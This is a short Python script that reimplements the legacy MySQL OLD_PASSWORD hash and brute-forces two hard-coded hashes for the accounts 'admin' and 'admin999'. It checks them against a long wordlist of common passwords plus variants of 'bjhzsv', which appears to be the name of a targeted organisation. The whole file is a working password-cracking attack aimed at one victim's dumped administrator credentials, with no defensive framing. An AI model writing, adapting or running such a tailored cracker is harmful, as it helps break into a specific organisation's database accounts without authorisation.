# Test common passwords directly
def mysql_old_password(password):
    nr = 1345345333
    add = 7
    nr2 = 0x12345671
    for c in password:
        if c == " " or c == "\t":
            continue
        byte = ord(c)
        nr ^= (((nr & 63) + add) * byte) + (nr << 8)
        nr2 += (nr2 << 8) ^ nr
        add += byte
    nr &= 0x7fffffff
    nr2 &= 0x7fffffff
    return "%08lx%08lx" % (nr, nr2)

# Common password list to check
common = [
    "", "password", "123456", "12345678", "qwerty", "admin", "Admin", "ADMIN",
    "admin123", "Admin123", "root", "Root", "toor", "bjhzsv", "bjhzsv.com",
    "12345", "1234", "123456789", "1234567890", "passw0rd", "P@ssw0rd",
    "letmein", "welcome", "monkey", "dragon", "master", "sunshine",
    "princess", "football", "iloveyou", "trustno1", "abc123", "123qwe",
    "qwerty123", "1q2w3e4r", "qwe123", "password1", "password123",
    "admin999", "admin9999", "9999", "99999", "adminadmin",
    "manager", "server", "mysql", "database", "bjhzsv2010", "bjhzsv2020",
    "bjhzsv2023", "bjhzsv2024", "bjhzsv2025", "bjhzsv2026",
    "webmaster", "administrator", "Administrator", "sa", "root123",
    "pass", "pass123", "test", "Test", "test123", "guest", "Guest",
    "user", "User", "user123", "default", "Default", "temp", "temp123",
    "bjhzsv_admin", "system", "System", "changeme", "secret",
    "bjhzsv2015", "bjhzsv2018", "bjhzsv2019", "bjhzsv2021", "bjhzsv2022",
    "superadmin", "SuperAdmin", "super", "Super", "control",
    "admin2010", "admin2020", "admin2021", "admin2022", "admin2023",
    "admin2024", "admin2025", "admin2026",
    "zabbix", "Zabbix", "nagios", "Nagios", "monitoring",
    "cisco", "Cisco", "router", "ROOT", "toor",
    "0", "00", "000", "0000", "00000", "000000",
    "1", "11", "111", "1111", "11111", "111111",
    "a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa",
    "password!", "Passw0rd", "P@ssword", "p@ssword", "pa\$\$word",
    "qwerty12345", "asdfgh", "zxcvbn", "1qaz2wsx",
    "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwerty123456",
    "pass1234", "Pass1234", "Admin@123", "admin@123",
    "admin#123", "Admin#123", "@dmin", "@dmin123",
    "root1234", "Root123", "Root1234", "r00t", "R00t",
    "bjhz", "bjhzsv2016", "bjhzsv2014", "bjhzsv2013",
    "qwerty1", "QWERTY", "Qwerty", "qwert123", "qwerty1234",
    "m0nkey", "dragon1", "Monkey", "Dragon", "Master",
    "PASSWORD", "Password", "passwd", "Passwd",
    "changethis", "summer2023", "summer2024",
    "winter2023", "winter2024", "spring2023", "fall2023",
    "bjhzsv2011", "bjhzsv2012", "bjhzsv2017",
    "c0ntr0l", "control123", "C0ntrol",
    "S3rv3r", "server123", "Server123", "s3rv3r",
    "D4t4b4s3", "database123",
    "Mysql", "mysql123", "MySQL", "MYSQL",
    "P@ss123", "p@ss123", "pass@123", "Pass@123",
    "weblogic", "tomcat", "jboss", "wildfly",
    "admin1", "admin2", "admin3", "admin4", "admin5",
    "Admin1", "Admin2", "Admin3",
    "123admin", "123admin123", "123456a", "123456b",
    "1q2w3e4r5t", "qwerty123456789",
    "!@#$%", "!@#$%^", "!@#$%^&", "!@#$%^&*",
    "qwertyuio", "asdfghjkl;", 
    "passw0rd!", "P@\$\$w0rd", "P@ssw0rd!",
    "mypass", "mypassword", "mypassword123",
    "bjhzsv123", "bjhzsv1234", "bjhzsv12345",
    "abc", "abcd", "abcde", "abcdef",
    "123abc", "abc123!", "123abc!",
    "qazwsx", "wsxzaq", "1qazxsw2",
]

targets = {"2d9d5942943a1323": "admin", "79dca16741891333": "admin999"}
found = {}

for pwd in common:
    h = mysql_old_password(pwd)
    if h in targets:
        found[h] = pwd
        print("FOUND: %s:%s -> %s" % (targets[h], h, pwd))

if found:
    print("\n=== RESULTS ===")
    for h, username in targets.items():
        if h in found:
            print("%s (%s): %s" % (username, h, found[h]))
        else:
            print("%s (%s): NOT FOUND in common list" % (username, h))
else:
    print("No passwords found in common password list")
